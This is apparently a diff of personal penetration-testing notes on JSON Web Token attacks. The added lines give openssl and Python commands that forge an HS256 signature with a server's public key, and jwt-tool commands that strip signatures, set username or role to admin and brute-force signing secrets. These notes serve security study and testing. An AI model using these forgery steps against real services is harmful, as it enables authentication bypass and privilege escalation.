@@ -1,6 +1,3 @@
-
-- Install Json Web Tokens extensions in burp.
-
 ## Theory
 
 - Used to authenticate
@@ -51,12 +48,26 @@ None
 - If the algorithm is RS256 change to HS256 and sign the token with the public key (which you can get by visiting jwks Uri / mostly it will be the public key from the site’s https certificate)
 - Send the request with the modified token and check the response.
 
+Catch the public key, then :
+- script in python to do that.
+- or use jwt.io to have the first two parts of your jwtoken, then
+
+```
+cat pub.key | xxd -p | tr -d "\\n"
+
+echo -n "<jwt_without_signature>" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<pubkey_in_hex>
+
+python -c "exec(\"import base64,binascii;print(base64.urlsafe_b64encode(binascii.a2b_hex(b'496ed19de73419b6caaa5df35cb56ba88a9565b482338f7fcd60a462f301c239')))\")"
+
+```
+
+eventually remove the = at the end.
+
+put the signature at the end of the first two parts
 
 ### Signature not checked
 
 - Just remove the signature.
-
-### Install jwt heartbreaker on burp.
 
 ### Brute force key
 
@@ -80,7 +91,24 @@ https://jwt.io/#debugger-io
 ![bf63cc72584b01b0bd61cd15b6dffda4.png](../_resources/b85e88dd7dd34d669a103a58419edc06.png)
 
 
+## Tool for JWT
+
+### jwt-tool
+
+- Change signature to None : ``-X a`
+- Modify username field by admin  : `jwt-tool <jwt_token> -I -pc username -pv admin`
+- Bruteforce the secret on symetrical encryption (HS512...): `jwt-tool <jwt_token> -C -d <dictionnary_file>`
+- Modify it with the good secret : `jwt-tool <jwt_token> -I -pc role -pc admin -S hs512 -p <secret>`
+- jwt with a public key : `jwt-tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Y6AeSWAcgxAUyPkxSKEajm8NxKZFHlJqOPp62JPio0NiamTmTzc-YEKt3ZyguLjf5yQcTSPW1WNjBnW-O3OPnHRi2z2rOoCbvx-RYSqXWq0cJsB0Ig6ICdWQtFCW7vEjTccQCcL6vGqw1BlimhfwvuuKFhziyGNDKs0ut22eg21xyY0ny3wZ1meMsBgmgYCzcWO5r5s0ICeYeeaBz__JRcQ42k7-WbdHkQg488_nV3hm_omG1oIt751Yp-HZPphm-hi8YTJfjDWEBkz5ooQ3giwKK4MMJnDPxiJqn378UYnmlYvF1yGTXzm5FjRH12rzyAQcamOoWdA-l1Ol3GYIMg -V -pk /home/t0/key.rsa`
+
+### python
+
+- Use python-pyjwt
 
 ---
 
+## Try to fuzz the end of the jwt adding = or == (or \r or \n encoded in b64)
+
 https://jwt.io/introduction/
+
+
